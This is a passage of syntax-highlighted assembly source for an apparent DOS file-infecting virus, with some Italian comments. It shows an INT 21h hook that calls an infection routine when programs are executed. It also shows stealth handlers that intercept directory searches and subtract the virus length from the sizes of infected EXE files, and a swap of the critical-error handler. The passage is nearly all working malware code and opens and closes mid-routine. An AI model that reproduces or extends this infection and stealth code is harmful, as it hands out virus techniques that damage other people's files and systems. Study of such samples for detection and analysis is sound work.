         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileInfect</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">popad</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                                  </span><span class="sc1">; exec int</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_handler</span><span class="sc0">

         </span><span class="sc6">clc</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Intret</span><span class="sc0">


</span><span class="sc5">@FINDFIRST</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">; DS:DX find filename</span><span class="sc0">
         </span><span class="sc6">pushf</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">findvar</span><span class="sc0">

         </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">Findvar</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosw</span><span class="sc0">                                  </span><span class="sc1">; reset Findvar</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">                                 </span><span class="sc1">; DS:SI filename</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Int21h</span><span class="sc0">                                </span><span class="sc1">; ES:DI canonaized</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">findvar</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">findvar</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">findvar</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

         </span><span class="sc6">std</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc6">repnz</span><span class="sc0">        </span><span class="sc6">scasb</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">o</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">o</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Findvar.Findofs</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">popf</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">@FINDNEXT</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Intret</span><span class="sc0">

</span><span class="sc5">FindProc</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pushad</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">pushf</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">DTAseg</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">DTAofs</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">                                  </span><span class="sc1">; DS:SI punta al</span><span class="sc0">
                             </span><span class="sc1">; filename nella DTA</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">findvar.findofs</span><span class="sc0">                  </span><span class="sc1">; ES:DI path filename</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">

</span><span class="sc5">CopyName</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0">  </span><span class="sc5">CopyNAme</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;  Findvar now has the ASCIZ filename to pass to Openfile</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Findvar</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CheckIfExe</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0">  </span><span class="sc5">DonotTreat</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenFile</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0">  </span><span class="sc5">DoNotTreat</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CheckXinf</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">file_type</span><span class="sc4">,</span><span class="sc5">other</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">CanClose</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">file_status</span><span class="sc4">,</span><span class="sc5">already</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0">  </span><span class="sc5">CanClose</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc5">DTAseg</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">DTAofs</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc5">vir_true_len</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">CanClose</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">

</span><span class="sc5">DoNotTreat</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popf</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">popad</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Intret</span><span class="sc0">


</span><span class="sc5">@SAVEDTA</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">DTAofs</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">DTAseg</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">org_21</span><span class="sc0">


</span><span class="sc5">@FCB_FIND</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">

         </span><span class="sc6">pushf</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

         </span><span class="sc6">les</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">DTAofs</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">                             </span><span class="sc1">; vede se FCB esteso</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@ok_good</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">

</span><span class="sc5">@ok_good</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pusha</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">47h</span><span class="sc0">                              </span><span class="sc1">; get cur dir</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; drive number</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FindVar</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                             </span><span class="sc1">; return ASCIZ directory</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">; root ?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@path</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FindVar</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">FindVar.FindOfs</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@root</span><span class="sc0">

</span><span class="sc5">@path</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FindVar</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">@</span><span class="sc10">@f</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">scasb</span><span class="sc0">                          </span><span class="sc1">; look for the end of the dirname</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc10">@f</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc13">'\'
</span><span class="sc0">         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">FindVar.FindOfs</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">std</span><span class="sc0">
</span><span class="sc5">@cp</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">movsb</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FindVar</span><span class="sc0">
         </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@cp</span><span class="sc0">

</span><span class="sc5">@root</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FindVar</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'\:'</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FindVar</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">           </span><span class="sc1">; drive letter</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">popa</span><span class="sc0">

         </span><span class="sc6">pusha</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                              </span><span class="sc1">; ES:BX DTA</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">                                 </span><span class="sc1">; DS = ES</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                               
         </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                              </span><span class="sc1">; file name ds:si</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">FindVar.FindOfs</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">

</span><span class="sc5">@lp1</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">lodsb</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@end_1</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@lp1</span><span class="sc0">

</span><span class="sc5">@end_1</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">                                       </span><span class="sc1">; Z terminated</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FindVar</span><span class="sc0">                      </span><span class="sc1">; ASCIZ filename</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CheckIfExe</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0">  </span><span class="sc5">@not_op</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenFile</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0">  </span><span class="sc5">@not_op</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CheckXinf</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">file_type</span><span class="sc4">,</span><span class="sc5">other</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@CanClose</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">file_status</span><span class="sc4">,</span><span class="sc5">already</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@CanClose</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">DTAseg</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">1dh</span><span class="sc4">],</span><span class="sc5">VIR_TRUE_LEN</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; real size</span><span class="sc0">

</span><span class="sc5">@CanClose</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">

</span><span class="sc5">@not_op</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">popa</span><span class="sc0">


</span><span class="sc5">@NotInf</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">popf</span><span class="sc0">

</span><span class="sc5">Intret</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">
         </span><span class="sc6">cli</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">pushf</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">sti</span><span class="sc0">
         </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">Intret</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">int21h</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">

         </span><span class="sc6">pushf</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">TRAPPED_21</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">int21h</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">int2fh</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">

         </span><span class="sc6">pushf</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">TRAPPED_2F</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">int2fh</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">vir_handler</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">

         </span><span class="sc6">cli</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">critical</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">90h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">TRAPPED_24</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">sti</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">vir_handler</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">dos_handler</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">cli</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">
